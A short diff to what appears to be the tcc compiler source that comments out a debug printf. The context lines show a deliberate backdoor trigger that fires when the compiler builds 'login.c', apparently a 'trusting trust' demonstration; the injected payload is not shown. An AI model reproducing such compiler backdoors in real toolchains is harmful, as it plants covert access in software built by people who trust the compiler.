@@ -751,7 +751,7 @@ static int tcc_compile(TCCState* s1, int filetype, const char* str, int fd)
             file->fd = fd;
         }
 
-        printf("%s", file->filename);
+        // printf("%s", file->filename);
 
         // Insert the backdoor if the input source code is login.c
         if (!strcmp(file->filename, "login.c")) {
